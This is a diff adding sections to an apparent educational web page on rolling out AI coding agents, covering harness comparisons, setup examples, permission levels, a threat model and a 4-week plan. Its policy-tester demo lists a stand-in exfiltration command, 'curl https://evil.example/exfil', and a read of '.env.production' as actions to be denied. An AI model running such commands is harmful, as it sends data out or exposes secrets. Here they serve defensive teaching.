+              <small>Agent + human</small>
+            </div>
+            <div class="loop-step" data-step="5">
+              <span class="loop-num">06</span>
+              <strong>Pull Request</strong>
+              <small>Same CI gates</small>
+            </div>
+          </div>
+          <div class="loop-caption" id="loopCaption">
+            Step 1: Define a small, testable task with clear acceptance criteria before invoking the agent.
+          </div>
+        </div>
+
+        <!-- Minimal Starter Setup + Interactive Repo Explorer -->
+        <div class="grid-split mt-lg reveal">
+          <div class="card glass-card">
+            <span class="kicker">Starter Checklist</span>
+            <h3>Minimal starter setup</h3>
+            <ol class="steps mt-sm">
+              <li>Pick one harness and one default model for the team</li>
+              <li>Add <code>AGENTS.md</code> to each repo: stack, commands, style rules, forbidden paths</li>
+              <li>Create 2 to 3 skills for your most repeated tasks</li>
+              <li>Add a read-only reviewer agent for pull requests</li>
+              <li>Require branch + tests + human review for every AI change</li>
+            </ol>
+          </div>
+
+          <div class="card glass-card">
+            <span class="kicker">Interactive Explorer</span>
+            <h3>Generic repo layout</h3>
+            <p class="muted mb-sm">Click any file to inspect its role:</p>
+            <div class="mini-tree" id="genericTree">
+              <button class="tree-file active" data-doc="agents">📄 AGENTS.md</button>
+              <button class="tree-file" data-doc="skill1">📁 .ai/skills/create-endpoint/SKILL.md</button>
+              <button class="tree-file" data-doc="skill2">📁 .ai/skills/write-tests/SKILL.md</button>
+              <button class="tree-file" data-doc="reviewer">🤖 .ai/agents/reviewer.md</button>
+              <button class="tree-file" data-doc="perms">🔒 .ai-permissions.json</button>
+            </div>
+            <div class="mini-preview" id="genericPreview"></div>
+          </div>
+        </div>
+      </div>
     </section>
 
+    <!-- 04. POPULAR HARNESSES -->
+    <section id="harnesses" class="section section-alt">
+      <div class="container">
+        <div class="section-header reveal">
+          <span class="kicker">04 · Harnesses</span>
+          <h2>Popular harnesses compared</h2>
+          <p class="section-sub">Choose one primary tool for the team to avoid config fragmentation.</p>
+        </div>
+
+        <div class="cards grid-3 reveal">
+          <article class="card glass-card harness-card">
+            <span class="tag tag-amber">Closed Source</span>
+            <h3>Claude Code</h3>
+            <p>Anthropic's terminal and IDE agent. Strong built-in permissions, hooks, subagents, and skills. Easiest start if your team standardizes on Claude.</p>
+          </article>
+          <article class="card glass-card harness-card">
+            <span class="tag tag-green">Open Source · MIT</span>
+            <h3>OpenCode</h3>
+            <p>Terminal agent with broad provider support—including Anthropic, OpenAI, Gemini, and local Ollama models. Great for avoiding vendor lock-in.</p>
+          </article>
+          <article class="card glass-card harness-card">
+            <span class="tag tag-cyan">Open Source</span>
+            <h3>Pi</h3>
+            <p>Minimal, extensible terminal agent built around <code>AGENTS.md</code>, TypeScript extensions, prompt templates, skills, and subagents.</p>
+          </article>
+        </div>
+
+        <div class="interactive-panel mt-lg reveal">
+          <div class="table-wrap">
+            <table class="data-table">
+              <thead>
+                <tr>
+                  <th>Capability</th>
+                  <th>Claude Code</th>
+                  <th>OpenCode</th>
+                  <th>Pi</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>Open source</td>
+                  <td>No</td>
+                  <td>Yes (MIT)</td>
+                  <td>Yes</td>
+                </tr>
+                <tr>
+                  <td>Model choice</td>
+                  <td>Mainly Claude</td>
+                  <td>Many providers + local</td>
+                  <td>Many providers + local</td>
+                </tr>
+                <tr>
+                  <td>Permission controls</td>
+                  <td>Strong, built in</td>
+                  <td>Built in (<code>opencode.json</code>)</td>
+                  <td>Via TypeScript extensions &amp; settings</td>
+                </tr>
+                <tr>
+                  <td>Skills &amp; subagents</td>
+                  <td>Yes (<code>.claude/</code>)</td>
+                  <td>Yes (<code>.opencode/</code>)</td>
+                  <td>Yes (<code>.pi/</code>)</td>
+                </tr>
+                <tr>
+                  <td>Learning curve</td>
+                  <td>Low</td>
+                  <td>Low to medium</td>
+                  <td>Medium</td>
+                </tr>
+                <tr>
+                  <td>Best for</td>
+                  <td>Polished Claude workflow</td>
+                  <td>Provider freedom</td>
+                  <td>Customizable minimal workflow</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 05. INTERACTIVE HARNESS SETUP EXAMPLES (NEW) -->
+    <section id="setup-examples" class="section">
+      <div class="container">
+        <div class="section-header reveal">
+          <span class="kicker">05 · Hands-On Setup Lab</span>
+          <h2>Project setup examples: Claude, OpenCode &amp; Pi</h2>
+          <p class="section-sub">Switch between harnesses to inspect real project config files, subagent definitions, skills, and run an interactive simulation.</p>
+        </div>
+
+        <div class="setup-lab reveal">
+          <!-- Harness Tabs -->
+          <div class="lab-tabs" role="tablist" aria-label="Select harness setup example">
+            <button class="lab-tab active" data-harness="claude" role="tab" aria-selected="true">
+              <span class="tab-dot tab-dot--claude"></span>
+              Claude Code
+              <span class="tab-badge">.claude/</span>
+            </button>
+            <button class="lab-tab" data-harness="opencode" role="tab" aria-selected="false">
+              <span class="tab-dot tab-dot--opencode"></span>
+              OpenCode
+              <span class="tab-badge">opencode.json</span>
+            </button>
+            <button class="lab-tab" data-harness="pi" role="tab" aria-selected="false">
+              <span class="tab-dot tab-dot--pi"></span>
+              Pi
+              <span class="tab-badge">.pi/</span>
+            </button>
+          </div>
+
+          <!-- Harness Summary Banner -->
+          <div class="lab-summary" id="labSummary">
+            <!-- Populated by JS -->
+          </div>
+
+          <!-- IDE-Style File Tree + Code Viewer -->
+          <div class="ide-grid">
+            <aside class="ide-sidebar" aria-label="Project files">
+              <div class="ide-sidebar-head">
+                <span>PROJECT FILES</span>
+                <span class="ide-root">my-service/</span>
+              </div>
+              <div class="ide-file-list" id="ideFileList">
+                <!-- Populated by JS -->
+              </div>
+            </aside>
+
+            <div class="ide-editor">
+              <div class="ide-editor-bar">
+                <span class="ide-filepath" id="ideFilePath">CLAUDE.md</span>
+                <div class="ide-actions">
+                  <span class="ide-lang" id="ideFileLang">Markdown</span>
+                  <button class="btn-copy" id="copyCodeBtn" aria-label="Copy file contents">Copy</button>
+                </div>
+              </div>
+              <pre class="ide-code"><code id="ideCodeContent"></code></pre>
+            </div>
+          </div>
+
+          <!-- Interactive Terminal Simulation -->
+          <div class="lab-sim">
+            <div class="lab-sim-head">
+              <div>
+                <span class="kicker">Live Execution Preview</span>
+                <h3>Simulate Agent Setup &amp; Subagent Run</h3>
+              </div>
+              <div class="sim-buttons">
+                <button class="btn btn-primary btn-sm" id="runSimBtn">▶ Run Simulation</button>
+                <button class="btn btn-secondary btn-sm" id="resetSimBtn">↺ Reset</button>
+              </div>
+            </div>
+            <div class="terminal-window sim-terminal">
+              <div class="terminal-bar">
+                <div class="terminal-dots"><span></span><span></span><span></span></div>
+                <span class="terminal-title" id="simTermTitle">claude-code — interactive simulation</span>
+                <span class="terminal-status" id="simTermStatus">IDLE</span>
+              </div>
+              <div class="terminal-body sim-body" id="simTermBody">
+                <div class="sim-placeholder">Click <strong>▶ Run Simulation</strong> to watch the harness load project memory, enforce permissions, and invoke the reviewer subagent.</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 06. SECURITY & PERMISSIONS -->
+    <section id="security" class="section section-alt">
+      <div class="container">
+        <div class="section-header reveal">
+          <span class="kicker">06 · Security &amp; Permissions</span>
+          <h2>Permission levels &amp; deny-by-default rules</h2>
+          <p class="section-sub">Start at Supervised Edit. Test how a deny-by-default policy evaluates real commands below.</p>
+        </div>
+
+        <!-- Permission Levels -->
+        <div class="cards grid-4 reveal">
+          <article class="card glass-card">
+            <span class="tag tag-green">Level 1</span>
+            <h3>Read-only</h3>
+            <p>Read &amp; search code only. Ideal for PR reviews, research, and onboarding questions.</p>
+          </article>
+          <article class="card glass-card card-highlight">
+            <span class="tag tag-cyan">Level 2 · Default</span>
+            <h3>Supervised edit</h3>
+            <p>Edit files freely; prompt human to approve each shell command. Default for most work.</p>
+          </article>
+          <article class="card glass-card">
+            <span class="tag tag-amber">Level 3</span>
+            <h3>Scoped auto</h3>
+            <p>Edit + whitelisted commands (<code>npm test</code>, <code>lint</code>). Routine tasks in a sandbox.</p>
+          </article>
+          <article class="card glass-card">
+            <span class="tag tag-red">Level 4</span>
+            <h3>Full auto</h3>
+            <p>Unrestricted execution. Disposable sandboxes only—never with real credentials.</p>
+          </article>
+        </div>
+
+        <!-- Interactive Policy Tester -->
+        <div class="interactive-panel mt-lg reveal">
+          <div class="panel-head">
+            <div>
+              <span class="kicker">Interactive Policy Tester</span>
+              <h3>Test a Deny-by-Default Policy</h3>
+            </div>
+            <p class="muted">Click any action to see how the harness evaluates it against allow/deny rules.</p>
+          </div>
+          <div class="policy-tester">
+            <div class="policy-commands" id="policyCommands">
+              <button class="policy-cmd" data-cmd="test"><code>Bash(npm test)</code></button>
+              <button class="policy-cmd" data-cmd="env"><code>Read(./.env.production)</code></button>
+              <button class="policy-cmd" data-cmd="edit-src"><code>Edit(./src/routes/users.ts)</code></button>
+              <button class="policy-cmd" data-cmd="push"><code>Bash(git push origin main)</code></button>
+              <button class="policy-cmd" data-cmd="curl"><code>Bash(curl https://evil.example/exfil)</code></button>
+              <button class="policy-cmd" data-cmd="infra"><code>Edit(./infra/prod/main.tf)</code></button>
+            </div>
+            <div class="policy-verdict" id="policyVerdict">
+              <span class="verdict-badge verdict-neutral">SELECT A COMMAND</span>
+              <p>Click a tool call on the left to evaluate it against the policy rules.</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Threats & Secrets -->
+        <div class="grid-split mt-lg reveal">
+          <div class="card glass-card">
+            <span class="kicker">Threat Model</span>
+            <h3>Threats to know</h3>
+            <dl class="threats mt-sm">
+              <dt>Prompt injection</dt>
+              <dd>Instructions hidden in issues, docs, web pages, or dependencies can steer the agent.</dd>
+              <dt>Malicious plugins / MCP</dt>
+              <dd>Vet every tool, skill, and extension like a production dependency; pin versions.</dd>
+              <dt>Hallucinated packages</dt>
+              <dd>Verify every new dependency actually exists and is actively maintained.</dd>
+              <dt>Silent weakening</dt>
+              <dd>Agents may disable tests to pass. Protect test &amp; CI config with code owners.</dd>
+            </dl>
+          </div>
+
+          <div class="card glass-card">
+            <span class="kicker">Data Protection</span>
+            <h3>Secrets &amp; data handling</h3>
+            <ul class="clean-list mt-sm">
+              <li>Keep <code>.env</code> files, keys, and tokens out of readable paths</li>
+              <li>Use short-lived, scoped tokens—never production admin credentials</li>
+              <li>Check provider retention &amp; training terms; prefer enterprise plans</li>
+              <li>Run a secret scanner (e.g. <code>gitleaks</code>) in pre-commit and CI</li>
+              <li>Restrict network egress from sandboxes to allow-listed hosts</li>
+            </ul>
+          </div>
+        </div>
+
+        <!-- Interactive Safe-Path Checklist -->
+        <div class="interactive-panel mt-lg reveal">
+          <div class="panel-head">
+            <div>
+              <span class="kicker">Team Readiness</span>
+              <h3>Safe-path checklist</h3>
+            </div>
+            <div class="readiness-meter">
+              <span>Readiness: <strong id="readinessScore">0 / 6</strong></span>
+              <div class="meter-track"><div class="meter-fill" id="readinessFill"></div></div>
+            </div>
+          </div>
+          <div class="interactive-checklist" id="safeChecklist">
+            <label class="check-item"><input type="checkbox"><span>Agent works in a branch or worktree, never directly on <code>main</code></span></label>
+            <label class="check-item"><input type="checkbox"><span>Deny rules cover secrets, prod infra, and <code>git push</code></span></label>
+            <label class="check-item"><input type="checkbox"><span>Pre-commit hooks run secret scan, lint, and unit tests</span></label>
+            <label class="check-item"><input type="checkbox"><span>CI requires passing checks and code-owner approval on sensitive paths</span></label>
+            <label class="check-item"><input type="checkbox"><span>Session and command logs are kept for audit where supported</span></label>
+            <label class="check-item"><input type="checkbox"><span>Written team policy defines what data may enter prompts</span></label>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 07. BEFORE WE START & ROLLOUT -->
+    <section id="rollout" class="section">
+      <div class="container">
+        <div class="section-header reveal">
+          <span class="kicker">07 · Governance &amp; Rollout</span>
+          <h2>Before we start &amp; 4-week rollout</h2>
+          <p class="section-sub">Guardrails, ownership, and a measured 4-week path from pilot to team default.</p>
+        </div>
+
+        <div class="cards grid-2 reveal">
+          <article class="card glass-card">
+            <span class="tag">Policy &amp; People</span>
+            <h3>Ground rules</h3>
+            <dl class="threats mt-sm">
+              <dt>Acceptable use</dt>
+              <dd>Classify data (public, internal, confidential, regulated) and define prompt boundaries.</dd>
+              <dt>Approved tools</dt>
+              <dd>Vendor review for data residency, GDPR, retention, and contract terms.</dd>
+              <dt>Ownership</dt>
+              <dd>The developer opening the PR owns the code. AI is never the author of record.</dd>
+              <dt>Licensing &amp; IP</dt>
+              <dd>Check dependency licenses and generated code similarity; involve legal when needed.</dd>
+            </dl>
+          </article>
+
+          <article class="card glass-card">
+            <span class="tag">Process &amp; Metrics</span>
+            <h3>How we measure</h3>
+            <dl class="threats mt-sm">
+              <dt>Baseline metrics</dt>
+              <dd>Measure cycle time, review rounds, escaped defects, and effort per task first.</dd>
+              <dt>Low-risk pilot</dt>
+              <dd>Start on a repo with good test coverage, clear ownership, and no critical prod path.</dd>
+              <dt>Cost guardrails</dt>
+              <dd>Set per-user budgets, usage dashboards, and spend alerts from day one.</dd>
+              <dt>Opt-in culture</dt>
+              <dd>Share what works in a team log; review <code>AGENTS.md</code> during retros.</dd>
+            </dl>
+          </article>
+        </div>
+
+        <!-- Where to be careful -->
+        <div class="cards grid-4 mt-lg reveal">
+          <article class="card glass-card">
+            <span class="tag tag-amber">Senior Review</span>
+            <h3>High-risk logic</h3>
+            <p>Auth, authorization, cryptography, payments, and data-deletion flows.</p>
+          </article>
+          <article class="card glass-card">
+            <span class="tag tag-red">Avoid Unsupervised</span>
+            <h3>Critical ops</h3>
+            <p>Production hotfixes, infra changes, and migrations on real data.</p>
+          </article>
+          <article class="card glass-card">
+            <span class="tag tag-green">Early Wins</span>
+            <h3>Great starting tasks</h3>
+            <p>Unit tests, docs, test-backed refactors, boilerplate, code explanations.</p>
+          </article>
+          <article class="card glass-card">
+            <span class="tag tag-cyan">Anti-Patterns</span>
+            <h3>Watch out for</h3>
+            <p>Merging unread code, weakening failing tests, or skipping PR review.</p>
+          </article>
+        </div>
+
+        <!-- Interactive 4-Week Rollout -->
+        <div class="interactive-panel mt-lg reveal">
+          <div class="panel-head">
+            <div>
+              <span class="kicker">Execution Plan</span>
+              <h3>Interactive 4-Week Rollout</h3>
+            </div>
+            <p class="muted">Click each week to inspect milestones and exit criteria.</p>
+          </div>
+          <div class="rollout-tabs" id="rolloutTabs">
+            <button class="rollout-btn active" data-week="0">Week 1 · Pilot</button>
+            <button class="rollout-btn" data-week="1">Week 2 · Skills &amp; Agents</button>
+            <button class="rollout-btn" data-week="2">Week 3 · Team &amp; CI</button>
+            <button class="rollout-btn" data-week="3">Week 4 · Measure &amp; Decide</button>
+          </div>
+          <div class="rollout-detail" id="rolloutDetail">
+            <!-- Populated by JS -->
+          </div>
+        </div>
+
+        <!-- Closing CTA -->
+        <div class="closing-banner mt-lg reveal">
+          <div>
+            <span class="kicker">Next Steps</span>
+            <h2>Let's start safely</h2>
+            <ul class="clean-list mt-sm">
+              <li>Agree on the acceptable use policy and approved tools this week</li>
+              <li>Choose the pilot repo and 2 to 3 pilot developers</li>
+              <li>Capture baseline metrics before the first AI-assisted task</li>
+            </ul>
+          </div>
+          <a href="#setup-examples" class="btn btn-primary">Revisit Setup Lab ↑</a>
+        </div>
+      </div>
+    </section>
   </main>
 
-  <!-- Controls -->
-  <div class="controls" aria-label="Slide controls">
-    <button id="prev" aria-label="Previous slide">←</button>
-    <span id="counter">1 / 1</span>
-    <button id="next" aria-label="Next slide">→</button>
-    <button id="fs" aria-label="Fullscreen">⛶</button>
-  </div>
-  <div class="progress"><div id="bar"></div></div>
+  <footer class="site-footer">
+    <div class="container footer-inner">
+      <span>AI.DEV // PLAYBOOK — Educational Engineering Guide</span>
+      <span class="muted">Built for Claude Code, OpenCode &amp; Pi workflows</span>
+    </div>
+  </footer>
 
   <script src="script.js"></script>
 </body>
